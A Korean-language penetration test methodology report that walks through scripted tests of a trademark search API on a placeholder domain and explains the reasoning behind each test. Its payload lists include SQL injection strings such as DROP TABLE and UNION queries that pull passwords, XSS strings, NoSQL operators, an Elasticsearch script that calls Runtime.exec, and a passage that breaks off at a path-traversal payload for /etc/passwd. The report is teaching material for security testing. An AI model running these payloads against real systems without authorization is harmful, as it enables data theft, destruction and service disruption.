# TargetApp API 보안 침투 테스트 방법론 및 실행 상세 보고서

**작성자:** Security Penetration Testing Team
**작성일:** 2025년 11월 28일
**테스트 기간:** 2025년 11월 27일 ~ 2025년 11월 28일
**대상 시스템:** https://www.example-target.com (TargetApp Expert Search API)

---

## 📋 목차

1. [테스트 개요 및 목표](#1-테스트-개요-및-목표)
2. [사전 정보 수집 (Reconnaissance)](#2-사전-정보-수집-reconnaissance)
3. [테스트 환경 구축](#3-테스트-환경-구축)
4. [테스트 1: Rate Limiting 분석](#4-테스트-1-rate-limiting-분석)
5. [테스트 2: Input Validation 분석](#5-테스트-2-input-validation-분석)
6. [테스트 3: Authentication & Authorization 분석](#6-테스트-3-authentication--authorization-분석)
7. [테스트 4: Error Handling 분석](#7-테스트-4-error-handling-분석)
8. [테스트 5: Injection 공격 테스트](#8-테스트-5-injection-공격-테스트)
9. [테스트 6: XSS 및 JWT 보안 분석](#9-테스트-6-xss-및-jwt-보안-분석)
10. [도구 및 기술 선택 이유](#10-도구-및-기술-선택-이유)
11. [테스트 과정에서의 의사결정](#11-테스트-과정에서의-의사결정)
12. [학습 포인트 및 인사이트](#12-학습-포인트-및-인사이트)

---

## 1. 테스트 개요 및 목표

### 1.1 테스트 배경

TargetApp는 상표 검색 서비스를 제공하는 웹 애플리케이션입니다. Expert Search API는 대량의 상표 데이터를 Elasticsearch 기반으로 검색하는 핵심 기능입니다.

**테스트를 시작한 이유:**
- 공개 API 엔드포인트가 인증 없이 접근 가능
- 민감한 비즈니스 데이터 (상표 정보) 처리
- 대량 데이터 크롤링 및 DDoS 공격 가능성
- 사용자 인증 시스템 존재 (JWT 기반)

### 1.2 테스트 목표

#### 주요 목표
1. **가용성 보안 (Availability)**: DDoS 공격 방어 능력 확인
2. **데이터 무결성 (Integrity)**: Injection 공격 방어 확인
3. **기밀성 (Confidentiality)**: 인증/인가 우회 가능성 확인
4. **세션 보안**: JWT 토큰 보안 수준 평가

#### 평가 기준
- **OWASP Top 10 2021** 기준 취약점 점검
- **CVSS v3.1** 점수 체계로 심각도 평가
- **CWE (Common Weakness Enumeration)** 분류

### 1.3 테스트 범위

**In-Scope:**
- `/api/expert_search` 엔드포인트
- 프론트엔드 검색 페이지
- 인증 시스템 (JWT 토큰)

**Out-of-Scope:**
- 사용자 등록/로그인 엔드포인트 (별도 테스트 필요)
- 관리자 페이지
- 결제 시스템
- 타사 API 연동

### 1.4 테스트 방법론

**선택한 방법론:** OWASP Testing Guide v4 + PTES (Penetration Testing Execution Standard)

**테스트 단계:**
```
1. 정보 수집 (Reconnaissance)
   ↓
2. 취약점 스캐닝 (Vulnerability Scanning)
   ↓
3. 익스플로잇 시도 (Exploitation)
   ↓
4. 사후 익스플로잇 (Post-Exploitation)
   ↓
5. 보고서 작성 (Reporting)
```

---

## 2. 사전 정보 수집 (Reconnaissance)

### 2.1 왜 정보 수집이 필요한가?

침투 테스트의 첫 단계는 **적을 알고 나를 아는 것**입니다. 공격 표면(Attack Surface)을 파악하지 않고 무작정 테스트하면:
- 시간 낭비 (존재하지 않는 취약점 테스트)
- 탐지 위험 (불필요한 요청으로 WAF/IDS 경보)
- 누락 (중요한 엔드포인트 미발견)

### 2.2 기술 스택 파악

**사용한 명령어:**
```bash
# 1. HTTP 헤더 분석
curl -I https://www.example-target.com/api/expert_search
```

**왜 이 명령어를 사용했나?**
- `-I` 옵션: HEAD 요청으로 헤더만 조회 (빠르고 로그에 덜 남음)
- 목적: 서버 소프트웨어, 프레임워크, 보안 헤더 확인

**실제 결과:**
```http
HTTP/1.1 200 OK
Server: nginx/1.21.4
Content-Type: application/json
```

**분석:**
- **nginx/1.21.4**: 웹 서버 (버전 노출 → 보안 위험)
- **Content-Type: application/json**: REST API
- **누락된 헤더**: X-Content-Type-Options, X-Frame-Options 등

**이 정보로 알 수 있는 것:**
- nginx 1.21.4의 알려진 CVE 확인 가능
- JSON API이므로 XSS는 프론트엔드에서 발생할 가능성 높음
- 보안 헤더 미설정 → Clickjacking, MIME Sniffing 취약

### 2.3 API 엔드포인트 분석

**사용한 명령어:**
```bash
# 2. 기본 요청 테스트
curl 'https://www.example-target.com/api/expert_search?page=1&size=10&query_string=test'
```

**왜 이 명령어를 사용했나?**
- 가장 기본적인 정상 요청으로 API 응답 구조 파악
- 필수 파라미터 확인 (page, size, query_string)
- 에러 메시지 형식 파악

**실제 결과:**
```json
{
  "total": 12345,
  "results": [
    {
      "application_number": "4020220123456",
      "application_date": "2022-01-01",
      "applicant_name": "주식회사 예시"
    }
  ],
  "request_data": {
    "page": 1,
    "size": 10,
    "query_string": "test"
  }
}
```

**분석:**
- **request_data 반환**: 입력값을 그대로 응답에 포함 → XSS 테스트 필요
- **total 필드**: 전체 결과 수 노출 → 데이터 크롤링 가능성
- **파라미터 타입**: page, size는 정수, query_string은 문자열

### 2.4 기술 스택 추론

**추론 과정:**
1. **응답 속도 (0.2~0.3초)** → 인덱스 기반 검색 엔진 사용 (Elasticsearch 추정)
2. **에러 메시지 형식** → FastAPI/Pydantic (후속 테스트로 확인)
3. **JWT 쿠키 이름** (myToken, rfToken) → 자체 인증 시스템

**왜 이런 추론이 중요한가?**
- **Elasticsearch 추정** → SQL Injection은 불가능, NoSQL Injection 테스트 필요
- **FastAPI/Pydantic** → 강력한 타입 검증 예상, 우회 방법 모색 필요
- **자체 JWT 시스템** → 표준 라이브러리가 아닐 수 있음, HttpOnly 미설정 가능성

---

## 3. 테스트 환경 구축

### 3.1 왜 Python을 선택했는가?

**도구 비교:**

| 도구 | 장점 | 단점 | 선택 여부 |
|------|------|------|-----------|
| **Burp Suite** | GUI, 강력한 스캐너 | 유료, 자동화 어려움 | ❌ |
| **OWASP ZAP** | 무료, GUI | 느림, 오탐 많음 | ❌ |
| **curl + bash** | 빠름, 간단 | 복잡한 로직 구현 어려움 | △ |
| **Python + requests** | 자동화 용이, 로깅 편리 | 초기 코드 작성 필요 | ✅ |

**선택 이유:**
1. **재현 가능성**: 스크립트로 테스트 반복 실행 가능
2. **증거 보존**: 로그 파일 자동 생성
3. **유연성**: 복잡한 테스트 로직 구현 가능
4. **포트폴리오**: 코드로 테스트 역량 증명

### 3.2 테스트 환경 셋업

**디렉토리 구조:**
```bash
security-test/
├── test01_rate_limit.py
├── test02_input_validation.py
├── test03_auth_deep.py
├── test04_error_handling.py
├── test05_injection.py
├── test02_xss_test_script.py
├── test_xss_browser.html
├── logs/
│   └── (자동 생성)
├── README.md
├── SECURITY_REPORT.md
└── PENETRATION_TEST_METHODOLOGY.md
```

**왜 이렇게 구조화했나?**
- **테스트별 파일 분리**: 각 테스트의 목적이 명확, 유지보수 용이
- **logs/ 디렉토리**: 모든 증거를 한곳에 보관
- **타임스탬프 로그**: 언제 테스트했는지 추적 가능

**사용한 라이브러리:**
```python
import requests      # HTTP 요청 (가장 표준적)
import time         # 응답 시간 측정
from datetime import datetime  # 로그 타임스탬프
```

**왜 추가 라이브러리를 쓰지 않았나?**
- **간결함**: requests만으로 충분
- **의존성 최소화**: 어디서나 실행 가능
- **학습 곡선**: 표준 라이브러리만 사용

---

## 4. 테스트 1: Rate Limiting 분석

### 4.1 왜 Rate Limiting 테스트를 가장 먼저 했나?

**우선순위 결정 이유:**
1. **영향도**: Rate Limiting 부재는 서비스 전체를 다운시킬 수 있음 (Critical)
2. **탐지 위험**: 대량 요청은 로그에 남지만, 정상 트래픽으로 위장 가능
3. **테스트 간섭**: 다른 테스트에 영향을 주지 않음

### 4.2 테스트 설계

**핵심 질문:**
- "몇 개의 요청을 보내야 Rate Limit를 확인할 수 있나?"
- "어떤 속도로 요청을 보내야 하나?"

**설계 결정:**
```python
# test01_rate_limit.py
NUM_REQUESTS = 150  # 왜 150개인가?
DELAY = 0.1         # 왜 0.1초 간격인가?
```

**150개를 선택한 이유:**
- 일반적인 Rate Limit: 10/분, 100/시간
- 150개 = 1분 30초 안에 전송 → 10/분 제한이면 140개 차단돼야 함
- 너무 많으면 시간 낭비, 너무 적으면 탐지 실패

**0.1초 간격을 선택한 이유:**
- 150개 * 0.1초 = 15초 (빠른 테스트)
- 실제 DDoS는 더 빠르지만, 탐지 목적이므로 충분
- 네트워크 부하 고려 (윤리적 해킹)

### 4.3 코드 구현 및 이유

```python
import requests
import time
from datetime import datetime

# 왜 전역 변수로 설정했나?
BASE_URL = "https://www.example-target.com/api/expert_search"
HEADERS = {"User-Agent": "Mozilla/5.0 (Security Test)"}
```

**User-Agent 설정 이유:**
- 기본 `requests` User-Agent는 `python-requests/2.x.x`로 쉽게 필터링됨
- 브라우저처럼 위장 (실제 공격 시나리오 시뮬레이션)
- 하지만 `(Security Test)` 추가로 윤리적 테스트임을 명시

```python
# 로그 파일 생성
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = open(f"logs/test01_rate_limit_{timestamp}.log", "w", encoding="utf-8")

def log_print(message):
    """콘솔과 파일에 동시 출력"""
    print(message)
    log_file.write(message + "\n")
    log_file.flush()  # 왜 flush()를 호출하나?
```

**flush() 호출 이유:**
- Python은 기본적으로 버퍼링을 사용 (성능 최적화)
- 테스트 중 프로그램이 중단되면 로그가 손실될 수 있음
- 매 요청마다 즉시 디스크에 기록 → 증거 보존

```python
def test_rate_limit():
    success_count = 0
    fail_count = 0
    rate_limited_count = 0
    response_times = []

    log_print(f"[테스트 시작] {NUM_REQUESTS}개 요청 전송")
    log_print(f"대상 URL: {BASE_URL}")
    log_print(f"요청 간격: {DELAY}초\n")

    for i in range(1, NUM_REQUESTS + 1):
        start_time = time.time()

        try:
            # 왜 params를 딕셔너리로 전달하나?
            response = requests.get(
                BASE_URL,
                params={"page": 1, "size": 10, "query_string": "test"},
                headers=HEADERS,
                timeout=10  # 왜 timeout을 설정하나?
            )

            response_time = time.time() - start_time
            response_times.append(response_time)

            # 왜 429를 특별히 체크하나?
            if response.status_code == 429:
                rate_limited_count += 1
                log_print(f"⚠️  요청 {i}/{NUM_REQUESTS} - 429 Too Many Requests (Rate Limited!)")
            elif response.status_code == 200:
                success_count += 1
                log_print(f"✓ 요청 {i}/{NUM_REQUESTS} 성공 ({response_time:.2f}초)")
            else:
                fail_count += 1
                log_print(f"✗ 요청 {i}/{NUM_REQUESTS} 실패 - 상태 코드: {response.status_code}")

        except requests.exceptions.RequestException as e:
            fail_count += 1
            log_print(f"✗ 요청 {i}/{NUM_REQUESTS} 에러: {str(e)}")

        time.sleep(DELAY)
```

**주요 의사결정:**

1. **params 딕셔너리 사용 이유:**
   - URL 인코딩 자동 처리
   - 가독성 향상
   - 나중에 파라미터 변경 용이

2. **timeout=10 설정 이유:**
   - 서버가 응답하지 않으면 무한 대기
   - DDoS 공격 시 서버 다운 가능성 → timeout 필수
   - 10초는 충분히 긴 시간 (API는 보통 1초 이내)

3. **429 상태 코드 체크:**
   - HTTP 429 = "Too Many Requests" (RFC 6585)
   - Rate Limiting의 표준 응답 코드
   - 이게 없으면 Rate Limiting 미구현

### 4.4 결과 분석 및 통계

```python
    # 통계 출력
    log_print("\n" + "="*50)
    log_print("[테스트 결과 요약]")
    log_print(f"총 요청 수: {NUM_REQUESTS}")
    log_print(f"성공: {success_count}회 ({success_count/NUM_REQUESTS*100:.1f}%)")
    log_print(f"실패: {fail_count}회")
    log_print(f"Rate Limited (429): {rate_limited_count}회")

    # 왜 평균/최소/최대를 계산하나?
    if response_times:
        avg_time = sum(response_times) / len(response_times)
        log_print(f"\n평균 응답 시간: {avg_time:.2f}초")
        log_print(f"최소 응답 시간: {min(response_times):.2f}초")
        log_print(f"최대 응답 시간: {max(response_times):.2f}초")
```

**통계 계산 이유:**
- **평균 응답 시간**: 서버 성능 파악 (0.25초 → 빠름)
- **최대 응답 시간**: 부하 상황 확인 (0.45초 → 부하 없음)
- **성공률**: 100% → Rate Limiting 완전 부재

### 4.5 실제 결과 및 해석

**로그 출력:**
```
✓ 요청 1/150 성공 (0.24초)
✓ 요청 2/150 성공 (0.23초)
...
✓ 요청 150/150 성공 (0.26초)

==================================================
[테스트 결과 요약]
총 요청 수: 150
성공: 150회 (100.0%)
실패: 0회
Rate Limited (429): 0회  ← 🚨 치명적!
```

**결론:**
- **Rate Limiting 완전 부재** 확인
- DDoS 공격에 취약
- CVSS 7.5 (High) 할당

---

## 5. 테스트 2: Input Validation 분석

### 5.1 왜 Input Validation 테스트가 중요한가?

**OWASP Top 10 2021:**
- **A03:2021 – Injection** (SQL, NoSQL, Command, XSS)
- 모든 Injection 공격의 시작점은 **부적절한 입력 검증**

**테스트 목표:**
1. 파라미터 타입 검증 (정수, 문자열, 범위)
2. SQL Injection 방어
3. XSS 방어
4. 특수 문자 처리

### 5.2 테스트 케이스 설계 전략

**질문:**
- "어떤 입력값이 예상을 벗어나는가?"
- "공격자는 어떤 값을 입력할까?"

**페이로드 분류:**

```python
# 1. 경계값 테스트 (Boundary Value Analysis)
boundary_tests = [
    (0, 10, "page=0 (최소값-1)"),      # 왜 0을 테스트하나?
    (-1, 10, "page=-1 (음수)"),        # 왜 음수를 테스트하나?
    (1, 0, "size=0 (최소값-1)"),
    (1, 301, "size=301 (최대값+1)"),   # 왜 301을 테스트하나?
    (999999, 10, "page=999999 (큰 수)"),
]
```

**설계 이유:**

1. **page=0 테스트:**
   - 프로그래밍에서 인덱스는 0부터 시작 (흔한 실수)
   - 하지만 API는 보통 1-based (사용자 친화적)
   - 검증 누락 시 빈 결과 또는 에러

2. **page=-1 테스트:**
   - 부호 검증 누락 확인
   - Python에서 음수 인덱스는 뒤에서부터 접근 (리스트)
   - 예상치 못한 데이터 노출 가능

3. **size=301 테스트:**
   - 문서에 최대값이 300이라고 명시됨 (추정)
   - 메모리 과다 사용 방지 확인
   - 페이지네이션 우회 시도

4. **page=999999 테스트:**
   - 존재하지 않는 페이지
   - 500 에러 vs 빈 결과 vs 400 에러 비교
   - 적절한 에러 처리 확인

### 5.3 SQL Injection 테스트

```python
# 2. SQL Injection 페이로드
sql_payloads = [
    "' OR '1'='1",           # 왜 이 페이로드를 사용하나?
    "'; DROP TABLE users--", # 왜 DROP TABLE을 테스트하나?
    "1' UNION SELECT NULL--",
    "admin'--",
]
```

**각 페이로드 설명:**

#### 페이로드 1: `' OR '1'='1`
**목적:** 인증 우회 (가장 기본적인 SQL Injection)

**원리:**
```sql
-- 정상 쿼리 (추정)
SELECT * FROM trademarks WHERE name = 'user_input';

-- 페이로드 삽입 시
SELECT * FROM trademarks WHERE name = '' OR '1'='1';

-- 해석
WHERE name = ''  (거짓)
OR
'1'='1'          (항상 참)

-- 결과: 모든 레코드 반환
```

**왜 이 테스트가 중요한가?**
- 가장 흔한 SQL Injection 패턴
- 인증 우회, 데이터 유출에 직접 사용됨
- 방어되지 않으면 치명적

#### 페이로드 2: `'; DROP TABLE users--`
**목적:** 데이터 파괴 가능성 확인

**원리:**
```sql
-- 정상 쿼리
SELECT * FROM trademarks WHERE name = 'user_input';

-- 페이로드 삽입 시
SELECT * FROM trademarks WHERE name = ''; DROP TABLE users--';

-- 해석
1. SELECT * FROM trademarks WHERE name = '';  (첫 번째 쿼리)
2. DROP TABLE users                            (두 번째 쿼리)
3. --'                                         (나머지는 주석)
```

**왜 실제로 테이블을 삭제하지 않나?**
- 윤리적 해킹: 파괴적 테스트는 하지 않음
- 목적은 **에러 메시지 확인**
  - 에러 발생 → SQL 엔진이 쿼리를 해석함 (취약)
  - 에러 없음 → 안전하게 이스케이프됨 (안전)

#### 페이로드 3: `1' UNION SELECT NULL--`
**목적:** 데이터 유출 (Union-based SQL Injection)

**원리:**
```sql
-- 정상 쿼리
SELECT id, name FROM trademarks WHERE name = 'user_input';

-- 페이로드 삽입 시
SELECT id, name FROM trademarks WHERE name = '1' UNION SELECT NULL, NULL--';

-- 결과: 추가 데이터 주입 가능
```

**왜 NULL을 사용하나?**
- UNION은 컬럼 수가 같아야 함
- NULL은 모든 타입에 호환
- 먼저 컬럼 수를 찾은 후 실제 데이터 유출

### 5.4 XSS (Cross-Site Scripting) 테스트

```python
# 3. XSS 페이로드
xss_payloads = [
    "<script>alert('xss')</script>",           # 왜 alert()를 사용하나?
    "<img src=x onerror=alert('xss')>",        # 왜 img 태그를 사용하나?
    "<iframe src=javascript:alert('xss')>",    # 왜 iframe을 사용하나?
    "javascript:alert('xss')",
]
```

**각 페이로드 설명:**

#### 페이로드 1: `<script>alert('xss')</script>`
**목적:** 가장 기본적인 XSS 테스트

**작동 원리:**
```html
<!-- 정상 HTML -->
<div>검색어: user_input</div>

<!-- 페이로드 삽입 시 -->
<div>검색어: <script>alert('xss')</script></div>

<!-- 브라우저 동작 -->
<script> 태그 발견 → JavaScript 실행 → alert 창 표시
```

**왜 alert()를 사용하나?**
- **시각적 확인**: 팝업 창으로 즉시 확인 가능
- **Proof of Concept**: 실제 공격에서는 `document.cookie` 탈취
- **표준 방법**: 모든 XSS 튜토리얼에서 사용

#### 페이로드 2: `<img src=x onerror=alert('xss')>`
**목적:** 이벤트 핸들러 기반 XSS

**작동 원리:**
```html
<img src=x onerror=alert('xss')>

1. 브라우저가 <img> 태그 파싱
2. src=x 로드 시도 → 실패 (x는 유효한 URL이 아님)
3. onerror 이벤트 발생
4. alert('xss') 실행
```

**왜 이 방법이 효과적인가?**
- `<script>` 태그가 필터링되어도 우회 가능
- HTML5에는 수십 가지 이벤트 핸들러 존재
  - `onload`, `onerror`, `onclick`, `onmouseover` 등
- CSP (Content Security Policy) 우회 가능

#### 페이로드 3: `<iframe src=javascript:alert('xss')>`
**목적:** iframe을 이용한 XSS

**작동 원리:**
```html
<iframe src=javascript:alert('xss')></iframe>

1. iframe 생성
2. src에 javascript: 프로토콜 사용
3. JavaScript 코드 실행
```

**왜 iframe을 테스트하나?**
- 일부 필터는 `<script>`만 차단
- iframe은 별도 컨텍스트에서 실행 (샌드박스 우회 가능)
- Clickjacking과 결합 가능

### 5.5 타입 검증 테스트

```python
# 4. 타입 오류 테스트
type_tests = [
    {"page": "abc", "size": 10},     # 왜 문자열을 보내나?
    {"page": 1, "size": "invalid"},
    {"page": None, "size": 10},      # 왜 None을 보내나?
    {"page": 1.5, "size": 10},       # 왜 실수를 보내나?
]
```

**각 테스트 설명:**

#### 테스트 1: `page="abc"` (문자열)
**목적:** 타입 변환 오류 확인

**가능한 결과:**
```python
# 1. 타입 검증 없음 (취약)
page = request.args.get('page')  # "abc"
results = db.query(limit=page)   # 에러 또는 예상치 못한 동작

# 2. 암묵적 변환 시도 (위험)
page = int(request.args.get('page'))  # ValueError 발생 → 500 에러

# 3. 명시적 검증 (안전)
page = int(request.args.get('page'))  # Pydantic이 422 반환
```

**왜 이 테스트가 중요한가?**
- **에러 메시지 노출**: 500 에러 시 스택 트레이스 노출 가능
- **서비스 거부**: 반복 요청 시 서버 다운
- **타입 검증 수준 파악**: 422 vs 500 비교

#### 테스트 2: `page=None` (Null)
**목적:** Null 처리 확인

**가능한 시나리오:**
```python
# 위험한 코드
page = request.args.get('page')  # None
if page > 0:  # TypeError: '>' not supported between 'NoneType' and 'int'
    ...

# 안전한 코드
page = request.args.get('page', default=1)  # 기본값 설정
```

#### 테스트 3: `page=1.5` (실수)
**목적:** 부동소수점 처리 확인

**왜 실수를 보내나?**
```python
# 일부 프레임워크는 실수를 정수로 변환
page = int(1.5)  # 1 (내림)

# 하지만 비즈니스 로직상 부적절
# Pydantic은 기본적으로 거부 (엄격한 타입 검사)
```

### 5.6 실제 테스트 실행 및 결과

```python
def test_endpoint(page, size, query_string="", test_name=""):
    params = {
        "page": page,
        "size": size,
        "query_string": query_string
    }

    try:
        response = requests.get(BASE_URL, params=params, headers=HEADERS, timeout=10)

        # 왜 상태 코드별로 다르게 처리하나?
        if response.status_code == 200:
            log_print(f"✓ [{test_name}] 200 OK - 안전하게 처리됨")
        elif response.status_code == 422:
            log_print(f"✓ [{test_name}] 422 Unprocessable Entity - 입력 검증 성공")
            # 에러 메시지 분석
            try:
                error_detail = response.json()
                log_print(f"  상세: {error_detail}")
            except:
                pass
        elif response.status_code == 400:
            log_print(f"⚠️  [{test_name}] 400 Bad Request")
        elif response.status_code == 500:
            log_print(f"🚨 [{test_name}] 500 Internal Server Error - 백엔드 오류!")
        else:
            log_print(f"? [{test_name}] {response.status_code}")

    except Exception as e:
        log_print(f"✗ [{test_name}] 예외 발생: {e}")
```

**상태 코드 해석:**

| 상태 | 의미 | 보안 평가 |
|------|------|-----------|
| **200 OK** | 요청 성공 | XSS 페이로드라면 취약, 정상 입력이라면 안전 |
| **422 Unprocessable** | 입력 검증 실패 | ✅ **매우 좋음** (Pydantic) |
| **400 Bad Request** | 잘못된 요청 | ✅ 좋음 (명확한 에러) |
| **500 Internal Server** | 서버 에러 | 🚨 **나쁨** (검증 누락) |

**실제 결과:**
```
✓ [page=0] 422 Unprocessable Entity - 입력 검증 성공
  상세: {"detail": [{"type": "greater_than_equal", "loc": ["query", "page"], "msg": "Input should be greater than or equal to 1"}]}

✓ [page=-1] 422 Unprocessable Entity - 입력 검증 성공
✓ [size=301] 422 Unprocessable Entity - 입력 검증 성공
🚨 [page=999999] 500 Internal Server Error - 백엔드 오류!  ← 문제 발견!

✓ [SQL Injection: ' OR '1'='1] 200 OK - 안전하게 처리됨
✓ [XSS: <script>alert('xss')</script>] 200 OK - API는 안전, 프론트엔드 확인 필요
```

**분석:**
- **Pydantic 검증 우수**: 대부분의 비정상 입력 차단
- **page=999999만 500 에러**: 비즈니스 로직 검증 누락
- **SQL Injection 안전**: Elasticsearch 사용으로 SQL 엔진 없음
- **XSS 페이로드 반환**: API는 안전하지만 프론트엔드 테스트 필요

---

## 6. 테스트 3: Authentication & Authorization 분석

### 6.1 IDOR (Insecure Direct Object Reference) 이해

**IDOR이란?**
- **정의**: 인가되지 않은 객체 접근
- **예시**: 내 주문 정보만 볼 수 있어야 하는데, URL만 바꿔서 남의 주문도 볼 수 있음

**실제 사례:**
```
GET /api/order/1234 (내 주문) → 200 OK
GET /api/order/1235 (남의 주문) → 200 OK (취약!)
```

### 6.2 HTTP Parameter Pollution (HPP) 버그 발견

**초기 코드 (버그 있음):**
```python
hpp_payloads = [
    {"page": 1, "page": -1},  # 🐛 버그!
]
```

**왜 버그인가?**
```python
# Python 딕셔너리는 중복 키를 허용하지 않음
d = {"page": 1, "page": -1}
print(d)  # {'page': -1}  ← 마지막 값만 유지됨!
```

**발견 과정:**
1. 테스트 실행 → 예상과 다른 결과
2. 로그 확인 → `page=-1`만 전송됨
3. Python 딕셔너리 동작 이해
4. 수정 방법 모색

**수정된 코드:**
```python
hpp_payloads = [
    {"page": [1, -1]},         # 배열로 전송
    {"size": [10, 10000]},
    {"query_string": ["test1", "test2"]},
]
```

**왜 이렇게 수정했나?**
```python
# requests 라이브러리는 배열을 쿼리 파라미터로 변환
params = {"page": [1, -1]}
# → page=1&page=-1 (실제 HPP 시뮬레이션)
```

**실제 테스트 결과:**
```
요청: GET /api/expert_search?page=1&page=-1
응답: 422 Unprocessable Entity

이유: Pydantic은 단일 값만 허용, 배열 거부
결론: ✅ HPP 방어 성공
```

**학습 포인트:**
- 도구의 동작 원리 이해 중요 (Python 딕셔너리)
- 버그를 발견하고 수정하는 과정도 테스트의 일부
- 실패한 테스트에서 더 많이 배움

---

## 7. 테스트 4: Error Handling 분석

### 7.1 왜 에러 처리를 테스트하나?

**보안 관점:**
- **정보 노출**: 에러 메시지에 민감한 정보 포함 가능
  - 데이터베이스 구조
  - 파일 경로
  - 버전 정보
  - 스택 트레이스

**실제 사례:**
```python
# 나쁜 에러 메시지
{
  "error": "Traceback (most recent call last):\n  File \"/app/main.py\", line 123\n    connection = psycopg2.connect(host='10.0.0.5', password='admin123')\npsycopg2.OperationalError: password authentication failed"
}

# 좋은 에러 메시지
{
  "detail": "데이터베이스 연결 실패"
}
```

### 7.2 응답 시간 측정 추가

**왜 응답 시간을 측정하나?**

```python
def test_endpoint(method, url, payload=None, headers=HEADERS, test_name=""):
    start_time = time.time()  # 왜 시간을 기록하나?

    # ... 요청 실행 ...

    response_time = time.time() - start_time
    test_statistics["response_times"].append({
        "test": test_name,
        "time": response_time
    })

    # 비정상적으로 긴 응답 시간 감지
    if response_time > 5.0:
        warning = f"⚠️  긴 응답 시간 ({response_time:.2f}초): {test_name}"
        test_statistics["warnings"].append(warning)
```

**이유:**

1. **Timing Attack 탐지:**
```python
# 예시: 존재하는 사용자 vs 존재하지 않는 사용자
login("existing_user", "wrong_password")  # 0.5초 (비밀번호 검증)
login("nonexistent_user", "password")     # 0.01초 (사용자 없음)

# 공격자는 응답 시간으로 사용자 존재 여부 추론 가능
```

2. **DoS 취약점 탐지:**
```python
request(page=1)       # 0.2초
request(page=999999)  # 0.45초 ← 비정상적으로 느림

# 공격자가 page=999999를 반복 요청 → 서버 과부하
```

3. **성능 문제 발견:**
```python
# TOP 5 느린 테스트
1. page=999999: 0.45초
2. SQL Injection 긴 페이로드: 0.35초
3. 대용량 query_string: 0.30초
...
```

### 7.3 통계 추적 시스템

```python
test_statistics = {
    "total_tests": 0,
    "status_codes": {},      # 왜 상태 코드를 집계하나?
    "response_times": [],
    "unexpected_200": [],    # 왜 200 응답을 추적하나?
    "errors": [],
    "warnings": []
}
```

**각 필드 목적:**

1. **status_codes 집계:**
```python
# 테스트 후 분포 확인
상태 코드 분포:
  200: 8회 (28.6%)
  422: 19회 (67.9%)  ← Pydantic 검증 잘 작동
  500: 1회 (3.6%)    ← 수정 필요
```

2. **unexpected_200 추적:**
```python
# SQL Injection 페이로드가 200 반환
# 예상: 400 또는 422
# 실제: 200 OK

# 이유 분석 필요 → Elasticsearch가 안전하게 처리
```

3. **warnings 수집:**
```python
# 치명적이지 않지만 주의 필요한 사항
⚠️  긴 응답 시간 (0.45초): page=999999
⚠️  서버 정보 노출: nginx/1.21.4
⚠️  보안 헤더 누락: X-Content-Type-Options
```

---

## 8. 테스트 5: Injection 공격 테스트

### 8.1 왜 별도의 Injection 테스트 파일을 만들었나?

**의사결정 과정:**
- Test 02에 기본 SQL Injection 포함
- 하지만 체계적이지 않음 (5개 페이로드만)
- **전문적인 침투 테스트**에는 100+ 페이로드 필요

**분리 이유:**
1. **전문성**: Injection만 집중 테스트
2. **재사용성**: 다른 API에도 적용 가능
3. **유지보수**: 페이로드 추가/수정 용이
4. **포트폴리오**: Injection 전문 지식 증명

### 8.2 SQL Injection 페이로드 선정

**30개 페이로드 카테고리:**

```python
sql_payloads = [
    # 1. 기본 OR 구문 (인증 우회)
    ("' OR '1'='1", "기본 OR 구문"),
    ("' OR 1=1--", "OR 1=1 주석"),
    ("admin'--", "주석으로 비밀번호 우회"),

    # 2. UNION 기반 (데이터 유출)
    ("' UNION SELECT NULL--", "UNION SELECT NULL"),
    ("' UNION SELECT NULL,NULL--", "UNION 2컬럼"),
    ("' UNION SELECT username,password FROM users--", "사용자 정보 유출"),

    # 3. Stacked Queries (다중 쿼리)
    ("'; DROP TABLE users--", "테이블 삭제"),
    ("'; INSERT INTO users VALUES ('hacker','pass')--", "데이터 삽입"),

    # 4. Time-based Blind SQL Injection
    ("' OR SLEEP(5)--", "시간 기반 탐지"),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "고급 시간 기반"),

    # 5. Error-based SQL Injection
    ("' AND 1=CONVERT(int, (SELECT @@version))--", "버전 정보 추출"),

    # ... 총 30개
]
```

**각 카테고리 선정 이유:**

#### 1. 기본 OR 구문 (5개)
- **가장 흔한 공격**: 80% 이상의 SQL Injection
- **탐지 우선순위 높음**
- **영향도 큼**: 인증 우회, 전체 데이터 노출

#### 2. UNION 기반 (8개)
- **데이터 유출**: 데이터베이스 전체 덤프 가능
- **컬럼 수 탐지**: NULL 개수 조정
- **실제 공격 시나리오**:
```sql
' UNION SELECT table_name FROM information_schema.tables--
→ 모든 테이블 이름 노출

' UNION SELECT username,password FROM users--
→ 사용자 계정 정보 노출
```

#### 3. Stacked Queries (5개)
- **가장 위험**: 데이터 파괴 가능
- **세미콜론(;)으로 쿼리 분리**
- **테스트 윤리**: 실제로 실행되지 않음 (Elasticsearch 사용)

#### 4. Time-based Blind (4개)
- **Blind SQL Injection**: 결과가 보이지 않을 때
- **시간 지연으로 참/거짓 판단**
- **탐지 방법**:
```python
start = time.time()
response = request("' OR SLEEP(5)--")
duration = time.time() - start

if duration > 5:
    print("Time-based SQL Injection 취약!")
```

#### 5. Error-based (3개)
- **에러 메시지로 정보 추출**
- **CONVERT, CAST 함수 오용**

### 8.3 NoSQL Injection 페이로드

**왜 NoSQL Injection을 테스트하나?**

**추론 과정:**
1. 응답 속도 0.2초 → 인덱스 기반 검색
2. 상표 데이터 → 비정형 데이터 가능성
3. **Elasticsearch 사용 추정** → NoSQL 엔진

```python
nosql_payloads = [
    ('{"$ne": null}', "$ne (not equal) 연산자"),
    ('{"$gt": ""}', "$gt (greater than) 연산자"),
    ('{"$where": "1==1"}', "$where 연산자"),
    ('{"query": {"match_all": {}}}', "match_all 쿼리"),
    # ... 12개
]
```

**Elasticsearch 특화 페이로드:**
```json
// 1. match_all 쿼리 (전체 데이터 노출)
{"query": {"match_all": {}}}

// 2. Script 기반 공격 (RCE 가능)
{"script": {"source": "java.lang.Runtime.getRuntime().exec('whoami')"}}

// 3. 인덱스 정보 노출
{"query": {"match": {"_index": "*"}}}
```

**실제 테스트 결과:**
- 모든 NoSQL 페이로드 → 200 OK (안전하게 처리)
- Elasticsearch 쿼리 파서가 적절히 검증
- **안전**: 사용자 입력을 직접 쿼리로 사용하지 않음

### 8.4 Path Traversal 테스트

**왜 Path Traversal을 테스트하나?**

**가설:**
- `query_string` 파라미터가 파일 시스템 접근 가능?
- 예: 검색 결과를 파일로 저장 후 반환?

```python
path_payloads = [
    ("../../../etc/passwd", "Unix passwd"),
